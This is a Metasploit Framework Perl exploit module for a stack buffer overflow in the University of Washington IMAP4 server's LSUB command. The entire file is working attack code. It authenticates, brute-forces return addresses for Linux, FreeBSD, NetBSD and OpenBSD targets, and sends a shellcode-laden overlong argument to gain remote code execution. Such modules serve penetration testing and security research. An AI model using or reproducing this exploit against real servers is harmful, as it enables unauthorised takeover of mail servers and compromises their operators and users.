
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::uow_imap4_lsub;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
{
	'Name'  => 'University of Washington IMap4 LSUB Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ 'x86', 'sparc' ],
	'OS'    => [ 'bsd', 'linux' ],
	'Priv'  => 0,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'User name'],
		'PASS'  => [1, 'DATA', 'Password'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	},
	'Payload' => {
		'Space'  => 680,
		'MinNops'=> 400,
		'BadChars'  => "\x00",
		'Keys'   => ['+findsock'],
	},
	'Description'  => Pex::Text::Freeform(qq{
		This exploits a buffer overflow in the LSUB command. An overly long
		argument causes a classic stack buffer overflow.
	}),
	'Refs'  =>  [  
		['BID', 1110],
	],
	'Targets' => [ 
		[ "Linux / x86", 0xbffffdfc, 0xbfa00000, 400, 1064, \&Payloadx86 ],
		[ "FreeBSD / x86", 0xbfbffdfc, 0xbf100000, 400, 1064, \&Payloadx86 ],
		[ "NetBSD / SPARC", 0xeffffca0, 0xefa00000, 748, 1096, \&PayloadSPARC ],
		[ "OpenBSD / SPARC", 0xf7fffca0, 0xf7a00000, 748, 1096, \&PayloadSPARC ], # Older versions of obsd (ie. 2.6)
	],
	'Keys'  => ['imapd'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $target_user = $self->GetVar('USER');
	my $target_pass = $self->GetVar('PASS');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	my $curr_ret;

	$self->PrintLine(sprintf("[*] Starting brute force mode for target %s (%s).", $target->[0], $target_host));

	for (
		$curr_ret  = $target->[1];
		$curr_ret >= $target->[2];
		$curr_ret -= $target->[3]
	)
	{
		my $s = Msf::Socket::Tcp->new
		(
			'PeerAddr'  => $target_host, 
			'PeerPort'  => $target_port, 
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		);
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

# Clear the socket
		$s->Recv(-1);

		$s->Send(sprintf("1 LOGIN \"%s\" \"%s\"\r\n", $target_user, $target_pass));

		my $reply = $s->Recv(-1);
		if(!$reply || !($reply =~ /1 OK/))
		{
			$self->PrintLine('[*] Authentication error.');
			return;
		}

		$self->PrintLine(sprintf("[*] Trying return address 0x%.8x...", $curr_ret));
		$s->Send(sprintf("2 LSUB \"\" {%i}\r\n", $target->[4]));
		$s->Send($target->[5]->($curr_ret, $shellcode) . "\r\n");

		$self->Handler($s);
		$s->Close();
		undef($s);
		undef($reply);
	}

	return;
}



sub Payloadx86 {
	my $ret = shift;
	my $sc = shift;

	my $buf;

# XXX: More precise.
	$buf = $sc . pack("V", $ret) x 96;

	return $buf;
}

sub PayloadSPARC {
	my $ret = shift;
	my $sc = shift; 

	my $buf;

# We need more nops for padding (Yay for stack frames.) so we re-use the first (1032 - 680)
	$buf = substr($sc, 0, 1032 - 680) . $sc . pack("N", $ret - 32) x 15 . pack("N", $ret);

	return $buf;
}
